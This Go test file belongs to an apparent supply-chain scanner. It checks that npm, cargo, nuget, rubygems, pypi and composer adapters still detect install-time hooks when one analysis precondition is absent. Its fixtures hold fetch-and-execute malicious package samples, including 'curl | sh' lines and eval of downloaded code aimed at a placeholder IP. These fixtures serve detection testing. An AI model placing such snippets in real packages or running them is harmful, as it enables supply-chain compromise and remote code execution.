package conformance_test

import (
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/ecosystem"
	"ihbv.io/depsnort/internal/ecosystem/cargo"
	"ihbv.io/depsnort/internal/ecosystem/composer"
	"ihbv.io/depsnort/internal/ecosystem/gomod"
	"ihbv.io/depsnort/internal/ecosystem/npm"
	"ihbv.io/depsnort/internal/ecosystem/nuget"
	"ihbv.io/depsnort/internal/ecosystem/pypi"
	"ihbv.io/depsnort/internal/ecosystem/rubygems"
	"ihbv.io/depsnort/internal/graph"
)

// Install-surface conformance: the ASYMMETRIC PRECONDITION contract.
//
// Most adapters run more than one independent analysis over a package — npm
// scans lifecycle scripts AND the entry module, cargo scans build.rs AND
// proc-macro source, nuget scans PowerShell hooks AND MSBuild targets, and so
// on. Those analyses are independent: whether one has anything to look at says
// nothing about whether the other does.
//
// D-134 was exactly this contract broken in one adapter. npm's publishable-root
// pass began `if len(m.Scripts) == 0 { continue }`, placed above its own
// entry-module analysis, so a package with no lifecycle scripts had its loader
// entry module skipped entirely — reinstating the very evasion load-time
// analysis exists to catch. Every other adapter had it right; npm was the sixth
// place the same rule was applied and the one place it leaked, which is the
// D-15 failure shape this package was created to prevent.
//
// So each case below deletes the FIRST analysis's precondition and keeps only
// the SECOND's, then asserts the second still fires. An adapter that gates one
// analysis behind another's precondition returns no hooks and fails here.

// surfaceExtractor is the step-5 capability under test, restated so the suite
// depends on the behaviour rather than on any one adapter struct.
type surfaceExtractor interface {
	ExtractInstallSurface(path string, g *graph.Graph) error
}

// asymCase is one adapter's second-analysis fixture.
type asymCase struct {
	name string
	// absent names the precondition deliberately removed from the fixture.
	absent    string
	adapter   surfaceExtractor
	ecosystem string // graph node Ecosystem string for this adapter
	id        string
	files     map[string]string
	wantHook  string // hook node name that must be produced anyway
}

func asymCases() []asymCase {
	return []asymCase{
		{
			name:      "npm",
			absent:    "lifecycle scripts",
			adapter:   &npm.Adapter{},
			ecosystem: "npm",
			id:        "pkg:npm/asym-pkg@1.0.0",
			wantHook:  "module-load:index.js",
			files: map[string]string{
				// package.json carries no "scripts" key at all.
				"package.json": `{"name":"asym-pkg","version":"1.0.0","main":"index.js"}`,
				"index.js": `const https = require('https');
https.get('https://203.0.113.5/stage2', r => {
  let b = ''; r.on('data', d => b += d);
  r.on('end', () => eval(Buffer.from(b, 'base64').toString()));
});`,
			},
		},
		{
			name:      "cargo",
			absent:    "build.rs",
			adapter:   cargo.New(),
			ecosystem: "cargo",
			id:        "pkg:cargo/asym-pkg@1.0.0",
			wantHook:  "proc-macro",
			files: map[string]string{
				"Cargo.toml": "[package]\nname = \"asym-pkg\"\nversion = \"1.0.0\"\n\n[lib]\nproc-macro = true\n",
				"src/lib.rs": `use std::process::Command;
pub fn expand() {
    let out = reqwest::blocking::get("https://203.0.113.5/x").unwrap().bytes().unwrap();
    std::fs::write(&dest, &out).unwrap();
    Command::new(&dest).status().unwrap();
}`,
			},
		},
		{
			name:      "nuget",
			absent:    "PowerShell install hooks",
			adapter:   nuget.New(),
			ecosystem: "nuget",
			id:        "pkg:nuget/asym-pkg@1.0.0",
			wantHook:  "build/asym-pkg.targets",
			files: map[string]string{
				"build/asym-pkg.targets": `<Project><Target Name="Go" AfterTargets="Build">
<Exec Command="curl -s https://203.0.113.5/x | sh" />
</Target></Project>`,
			},
		},
		{
			name:      "rubygems",
			absent:    "extconf.rb and Rakefile",
			adapter:   rubygems.New(),
			ecosystem: "gem",
			id:        "pkg:gem/asym-pkg@1.0.0",
			wantHook:  "gemspec:extensions",
			files: map[string]string{
				// NOTE: the gemspec branch of AnalyzeRuby deliberately fires only
				// on a gemspec DECLARING native extensions, not on arbitrary
				// gemspec content — scanning every gemspec would trip CapExec on
				// the ubiquitous `git ls-files` idiom. The declaration is part of
				// the fixture for that reason, not incidental.
				"asym-pkg.gemspec": `Gem::Specification.new do |s|
  s.name = "asym-pkg"
  s.extensions = ["ext/extconf.rb"]
  system("curl -s https://203.0.113.5/x | sh")
end`,
			},
		},
		{
			name:      "pypi",
			absent:    "setup.py",
			adapter:   pypi.New(),
			ecosystem: "pypi",
			id:        "pkg:pypi/asym-pkg@1.0.0",
			wantHook:  "pyproject.toml:build-backend",
			files: map[string]string{
				"pyproject.toml": `[build-system]
requires = ["setuptools"]
build-backend = "backend"
backend-path = ["."]
`,
			},
		},
		{
			name:      "composer",
			absent:    "scripts",
			adapter:   composer.New(),
			ecosystem: "composer",
			id:        "pkg:composer/asym-pkg@1.0.0",
			wantHook:  "composer-plugin",
			files: map[string]string{
				"composer.json": `{
  "name": "vendor/asym-pkg",
  "type": "composer-plugin",
  "extra": { "class": "Vendor\\AsymPkg\\Plugin" },
  "autoload": { "psr-4": { "Vendor\\AsymPkg\\": "src/" } }
}`,
				"src/Plugin.php": `<?php
class Plugin {
  public function activate() {
    eval(file_get_contents('https://203.0.113.5/x'));
  }
}`,
			},
		},
	}
}

// singleAnalysisAdapters are exempt from the asymmetry contract because they
// run exactly one analysis, so there is no second one to strand. gomod collects
// every .go source under the module and hands the whole set to AnalyzeGo in one
// call. If an adapter here grows a second independent analysis, it must move
// into asymCases() instead.
func singleAnalysisAdapters() map[string]bool {
	return map[string]bool{"gomod": true}
}

func writeTree(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for rel, content := range files {
		p := filepath.Join(dir, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// TestInstallSurfaceAsymmetricPrecondition is the D-134 regression, generalized
// across every adapter that runs more than one analysis.
func TestInstallSurfaceAsymmetricPrecondition(t *testing.T) {
	for _, c := range asymCases() {
		t.Run(c.name, func(t *testing.T) {
			dir := writeTree(t, c.files)
			g := graph.New()
			g.AddNode(&graph.Node{
				ID: c.id, Kind: graph.KindPackage, Ecosystem: c.ecosystem,
				Name: "asym-pkg", Version: "1.0.0", Depth: 0,
			})
			g.MarkRoot(c.id)

			// A gap error is acceptable (the fixture is deliberately partial);
			// a missing hook is not.
			if err := c.adapter.ExtractInstallSurface(dir, g); err != nil {
				t.Logf("ExtractInstallSurface reported gaps: %v", err)
			}

			var got []string
			for _, n := range g.SortedNodes() {
				if n.Kind == graph.KindInstallHook {
					got = append(got, n.Name)
				}
			}
			for _, h := range got {
				if h == c.wantHook {
					return
				}
			}
			t.Errorf("with %s absent, expected hook %q to still be produced; got %v\n"+
				"this is the D-134 shape: one analysis gated behind another's precondition",
				c.absent, c.wantHook, got)
		})
	}
}

// TestEveryInstallSurfaceExtractorHasAsymCoverage asserts that every adapter
// implementing the step-5 capability is either exercised by the asymmetry
// contract above or explicitly recorded as single-analysis. A new ecosystem
// wired into the scan without an entry is the gap this asserts against — the
// same coverage guarantee TestEveryExpandedEcosystemIsCovered gives the walk.
func TestEveryInstallSurfaceExtractorHasAsymCoverage(t *testing.T) {
	all := map[string]any{
		"npm":      &npm.Adapter{},
		"cargo":    cargo.New(),
		"nuget":    nuget.New(),
		"rubygems": rubygems.New(),
		"pypi":     pypi.New(),
		"composer": composer.New(),
		"gomod":    gomod.New(),
	}

	covered := map[string]bool{}
	for _, c := range asymCases() {
		covered[c.name] = true
	}
	single := singleAnalysisAdapters()

	for name, a := range all {
		if _, ok := a.(ecosystem.InstallSurfaceExtractor); !ok {
			t.Errorf("%s: no longer implements InstallSurfaceExtractor — update this suite", name)
			continue
		}
		if !covered[name] && !single[name] {
			t.Errorf("%s implements InstallSurfaceExtractor but has neither an asymCases() entry "+
				"nor a singleAnalysisAdapters() exemption", name)
		}
		if covered[name] && single[name] {
			t.Errorf("%s is listed as both asymmetry-covered and single-analysis", name)
		}
	}
}
